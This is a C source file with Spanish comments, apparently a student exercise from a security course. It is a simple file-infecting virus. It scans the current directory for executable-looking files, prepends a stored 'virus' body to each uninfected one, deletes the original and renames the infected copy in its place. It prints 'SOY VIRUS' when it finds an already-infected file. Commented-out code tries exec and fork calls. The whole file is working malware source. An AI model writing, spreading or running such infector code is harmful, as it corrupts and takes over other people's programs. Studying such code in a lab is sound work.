#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>


int file_size = 13088;
int main(int argc, char const *argv[]) {

  struct dirent *de;
  DIR* dr = opendir(".");
  if(dr == NULL){
    printf("No entro\n" );
    return 0;
  }
  // printf("******************************************\n" );

  char* exe = "exe";
  pid_t pid;
  int victima_size;
  FILE* fptr;


  while(( de = readdir(dr)) != NULL ){

    // filtra los archivos por la extension exe
    if (  de->d_name[strlen(de->d_name)-3] == *exe ) {

// printf("******************************************\n" );
      fptr = fopen(de->d_name,"rb");
      fseek(fptr,0,SEEK_END);
      victima_size = ftell(fptr);
      printf("programa: --------%s\n", de->d_name);
      printf("victima size: ----%d\n", victima_size );
      printf("virus size: ------%d\n", file_size);
      // printf("name: ------------%s\n", argv[0]);

      if( victima_size != file_size ){
        // printf("estoy aqui: ------------*******--- %s\n", de->d_name );
        FILE* virus;
        FILE* vInfectada;
        char* data;
        virus = fopen("virus","rb");
        vInfectada = fopen("vInfectada","wb");
        data = (char*) malloc(file_size);
        fread(data, file_size, 1,virus);
        fwrite(data,file_size,1,vInfectada);
        data = (char*) malloc(victima_size);
        fread(data, victima_size, 1, fptr);
        fwrite(data,victima_size,1,vInfectada);
        remove(de->d_name);
        rename("vInfectada",de->d_name);
        fclose(virus);
        fclose(vInfectada);
        free(data);
      }
      else{
        // victima infectada
        printf("-------------------------\n");
        printf("******* SOY VIRUS *******\n" ); // Mensaje Bomba
        printf("-------------------------\n");


      }

    }



    // ejecutar un programa externo usando el PATH
    // printf("calling exec..\n" );
    // ret = execl(de->d_name, de->d_name,NULL);
  }
  closedir(dr);


  return 0;
}

// pid = fork();
// if( pid == 0){
//   execl(de->d_name, de->d_name,NULL);
// }


// ejecutar un programa externo sin el PATH
// char* args[] = {"victima1",NULL};
// ret = execvp("./victima1",args);

// ejecutar un programa externo usando el PATH
// printf("calling exec..\n" );
// ret = execl("/home/jojo/Documentos/Seguridad/victima1","victima1",NULL);


// printf("Failed exec -.... ret = %d\n", ret );
